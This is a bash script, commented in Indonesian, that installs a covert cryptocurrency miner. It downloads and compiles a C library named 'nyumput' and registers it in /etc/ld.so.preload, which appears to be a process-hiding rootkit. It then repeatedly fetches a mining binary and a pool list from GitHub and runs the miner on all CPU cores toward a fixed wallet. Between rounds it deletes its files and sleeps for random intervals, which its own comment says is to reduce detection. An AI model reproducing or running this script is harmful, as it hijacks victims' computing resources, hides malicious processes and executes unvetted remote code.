#!/bin/bash

# Memperbarui dan menginstal dependensi
sudo apt-get update
sudo apt-get install -y wget curl build-essential jq

# Mengunduh dan mengompilasi kode secara aman
curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
sudo mv libnyumput.so /usr/local/lib/
if ! grep -Fxq "/usr/local/lib/libnyumput.so" /etc/ld.so.preload; then
  echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
fi
rm nyumput.c

# Menjalankan dan mengelola proses
end_time=$(( $(date +%s) + 21600 ))  # 6 jam dari sekarang
while [ $(date +%s) -lt $end_time ]; do
  timestamp=$(date +%s)
  mkdir -p .lib
  dynamic_sgr=".lib/sgr_$timestamp"
  
  # Mendapatkan file eksekusi
  wget -q -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sru
  if [ ! -f $dynamic_sgr ]; then
    echo "Gagal mengunduh file eksekusi. Menunggu..."
    sleep 300
    continue
  fi
  chmod +x $dynamic_sgr

  # Mendapatkan dan memvalidasi daftar IP
  dynamic_list=".lib/list_$timestamp.json"
  wget -q -O $dynamic_list https://github.com/barburonjilo/setstra/raw/main/list4.json
  if [ ! -f $dynamic_list ] || ! jq '.' $dynamic_list > /dev/null 2>&1; then
    echo "Daftar IP tidak valid. Melewati iterasi ini."
    rm -f $dynamic_list
    sleep 300
    continue
  fi

  # Memilih IP acak
  ip=$(jq -r '.[]' $dynamic_list | shuf -n 1)
  if [ -z "$ip" ]; then
    echo "Tidak ada IP valid di daftar. Menunggu..."
    rm -f $dynamic_list
    sleep 300
    continue
  fi

  # Rotasi port untuk proses
  for port in $(seq 501 510); do
    nohup $dynamic_sgr -a yespowersugar --pool $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr --timeout 90 -t $(nproc) > /dev/null 2>&1 &
    process_pid=$!

    echo "Memulai proses dengan PID $process_pid pada IP $ip port $port"
    sleep 60
    kill $process_pid || true
  done

  # Membersihkan setelah setiap iterasi
  rm -f $dynamic_list
  rm -f $dynamic_sgr

  # Mengatur interval istirahat acak untuk mengurangi deteksi
  sleep $((RANDOM % 180 + 120))
done
